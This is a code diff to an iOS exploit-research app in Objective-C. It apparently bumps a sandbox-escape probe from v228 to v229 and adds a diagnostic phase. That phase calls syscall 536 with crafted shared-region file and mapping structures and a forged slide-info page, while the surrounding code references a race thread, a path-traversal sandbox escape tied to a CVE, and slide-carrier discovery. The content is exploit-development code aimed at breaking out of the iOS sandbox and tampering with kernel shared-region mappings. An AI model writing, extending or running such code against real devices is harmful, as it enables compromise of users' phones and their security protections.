@@ -943,7 +943,7 @@ static void *e2_free_and_ool_racer(void *arg) {
     UIButtonConfiguration *rieConf = [UIButtonConfiguration filledButtonConfiguration];
     rieConf.baseBackgroundColor = [UIColor systemPinkColor];
     self.rieProbeButton.configuration = rieConf;
-    [self.rieProbeButton setTitle:@"Rie SBX spawn (v228)" forState:UIControlStateNormal];
+    [self.rieProbeButton setTitle:@"Rie SBX spawn (v229)" forState:UIControlStateNormal];
     [self.rieProbeButton addTarget:self action:@selector(rieProbeTapped) forControlEvents:UIControlEventTouchUpInside];
     [self.view addSubview:self.rieProbeButton];
 
@@ -9166,7 +9166,7 @@ static uint64_t rie_find_exec_base(task_t task,
 
 - (void)rieProbeTapped {
     dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
-        [self appendLog:@"\n=== Rie v228: sandbox profile discovery + dyld string search ===\n"];
+        [self appendLog:@"\n=== Rie v229: syscall 536 parameter matrix diagnostic ===\n"];
         NSString *traversalPrefix = @"../../../../../../../../../../../../../";
 
         // ── Phase S: sandbox escape probe (CVE-2026-28995 technique) ──
@@ -9442,6 +9442,125 @@ static uint64_t rie_find_exec_base(task_t task,
             // Test syscall 536 with NULL args
             long rNull = sc(536, NULL, NULL, NULL, NULL);
             [self appendLog:[NSString stringWithFormat:@"syscall(536, NULL,NULL,NULL,NULL): ret=%ld errno=%d", rNull, errno]];
+
+            // ── Phase D-2: syscall 536 parameter matrix diagnostic ──
+            // Systematic probe to find exact EPERM trigger point
+            [self appendLog:@"\n── Phase D-2: syscall 536 parameter matrix ──"];
+            {
+                // Build test structures on heap for clean probing
+                struct rie_sr_file   *tf = calloc(1, sizeof(struct rie_sr_file));
+                struct rie_sr_mapping *tm = calloc(1, sizeof(struct rie_sr_mapping));
+                if (tf && tm) {
+                    // Prepare a valid-looking blob page for in-memory injection
+                    uint8_t *blobPage = mmap(NULL, 0x4000, PROT_READ|PROT_WRITE,
+                        MAP_ANON|MAP_PRIVATE, -1, 0);
+                    if (blobPage && blobPage != MAP_FAILED) {
+                        memset(blobPage, 0, 0x4000);
+                        // Put a minimal slide-info v5 header in the blob page
+                        // (will be parsed by kernel if fd=-1 slide_start is set)
+                        *(uint32_t*)(blobPage+0) = 5; // version 5
+                        *(uint32_t*)(blobPage+4) = 0x4000; // page_size
+                    }
+
+                    #define T536(nf,files,nm,maps,desc) do { \
+                        errno = 0; \
+                        long _r = sc(536, (long)(nf), (files), (long)(nm), (maps)); \
+                        [self appendLog:[NSString stringWithFormat: \
+                            @"  %-50s nf=%lld nm=%lld → ret=%ld errno=%d", \
+                            desc, (long long)(nf), (long long)(nm), _r, errno]]; \
+                    } while(0)
+
+                    // Test A: Zero everything (baseline)
+                    T536(0, NULL, 0, NULL, "A: baseline zero-args");
+
+                    // Test B: Just file count, no mappings
+                    tf->sf_fd = -1; tf->sf_mappings_count = 0; tf->sf_slide = 0;
+                    T536(1, tf, 0, NULL, "B: 1 file fd=-1 mc=0 sl=0");
+                    T536(1, tf, 1, tm,  "B2: 1 file fd=-1 + 1 empty mapping");
+
+                    // Test C: file fd=-1 with mapping count
+                    tf->sf_mappings_count = 1;
+                    T536(1, tf, 0, NULL, "C: 1 file fd=-1 mc=1 (no mappings arr)");
+                    T536(1, tf, 1, tm,  "C2: 1 file fd=-1 mc=1 + 1 mapping");
+
+                    // Test D: Add mapping with address
+                    tm->sms_address = 0x180000000ULL;
+                    tm->sms_size = 0x9000;
+                    tm->sms_max_prot = 5; tm->sms_init_prot = 5;
+                    tm->sms_file_offset = 0;
+                    tm->sms_slide_size = 0; tm->sms_slide_start = 0;
+                    T536(1, tf, 1, tm, "D: 1 file fd=-1 + mapping at SR base (no slide)");
+
+                    // Test E: mapping with slide info from blob page
+                    if (blobPage && blobPage != MAP_FAILED) {
+                        tm->sms_slide_size = 152;
+                        tm->sms_slide_start = (uint64_t)(uintptr_t)blobPage;
+                        T536(1, tf, 1, tm, "E: 1 file fd=-1 + mapping+slide (from blob page)");
+                        tm->sms_slide_size = 0; tm->sms_slide_start = 0;
+                    }
+
+                    // Test F: What if we just pass 0 files + 1 mapping (no file)?
+                    tf->sf_fd = -1; tf->sf_mappings_count = 0;
+                    T536(0, NULL, 1, tm, "F: 0 files + 1 mapping (no file entry)");
+
+                    // Test G: file fd=-1, mapping with file_offset matching blob
+                    tf->sf_mappings_count = 1;
+                    tm->sms_file_offset = (uint64_t)(uintptr_t)blobPage;
+                    T536(1, tf, 1, tm, "G: 1 file fd=-1 + mapping foff=blob (no slide)");
+
+                    // Test H: All fd=-1 — 2 files + 3 mappings (like Phase E but no real fds)
+                    {
+                        struct rie_sr_file tf2[2];
+                        struct rie_sr_mapping tm2[3];
+                        memset(tf2, 0, sizeof(tf2)); memset(tm2, 0, sizeof(tm2));
+                        tf2[0].sf_fd = -1; tf2[0].sf_mappings_count = 1;
+                        tf2[0].sf_slide = 0;
+                        tf2[1].sf_fd = -1; tf2[1].sf_mappings_count = 1;
+                        tf2[1].sf_slide = 0;
+                        tm2[0].sms_address = 0x180000000ULL;
+                        tm2[0].sms_size = 0x9000;
+                        tm2[0].sms_max_prot = 5; tm2[0].sms_init_prot = 5;
+                        tm2[1].sms_address = 0x180090000ULL;
+                        tm2[1].sms_size = 0x4000;
+                        tm2[1].sms_max_prot = 1; tm2[1].sms_init_prot = 1;
+                        if (blobPage && blobPage != MAP_FAILED) {
+                            tm2[1].sms_file_offset = (uint64_t)(uintptr_t)blobPage;
+                        }
+                        // mapping 2: try non-auth slide carrier (all in-memory)
+                        tm2[2].sms_address = 0x1e6710000ULL; // known NA carrier addr
+                        tm2[2].sms_size = 0x4000;
+                        tm2[2].sms_max_prot = 3; tm2[2].sms_init_prot = 1;
+                        if (blobPage && blobPage != MAP_FAILED) {
+                            tm2[2].sms_slide_size = 152;
+                            tm2[2].sms_slide_start = (uint64_t)(uintptr_t)blobPage;
+                        }
+                        T536(2, tf2, 3, tm2, "H: 2files(-1) + 3maps (all in-memory)");
+                    }
+
+                    // Test I: fd=-1 ONLY with nf=0 (can we pass in-memory file via mappings alone?)
+                    tf->sf_fd = -1; tf->sf_mappings_count = 1;
+                    T536(0, NULL, 1, tm, "I: 0 files, 1 mapping with addr/size only");
+
+                    // Test J: Just the blob page mapped in
+                    if (blobPage && blobPage != MAP_FAILED) {
+                        tf->sf_mappings_count = 1;
+                        tm->sms_address = 0x180090000ULL;
+                        tm->sms_size = 0x4000;
+                        tm->sms_file_offset = (uint64_t)(uintptr_t)blobPage;
+                        tm->sms_max_prot = 1; tm->sms_init_prot = 1;
+                        tm->sms_slide_size = 0; tm->sms_slide_start = 0;
+                        T536(1, tf, 1, tm, "J: 1 file fd=-1 + 1 mapping foff→blob (no slide)");
+                        tm->sms_slide_size = 152;
+                        tm->sms_slide_start = (uint64_t)(uintptr_t)blobPage;
+                        T536(1, tf, 1, tm, "J2: 1 file fd=-1 + 1 mapping foff→blob WITH slide");
+                    }
+
+                    #undef T536
+                    if (blobPage && blobPage != MAP_FAILED) munmap(blobPage, 0x4000);
+                }
+                if (tf) free(tf);
+                if (tm) free(tm);
+            }
         }
 
         // ── Phase E: Walk SR submap regions, find non-auth slide carrier ──
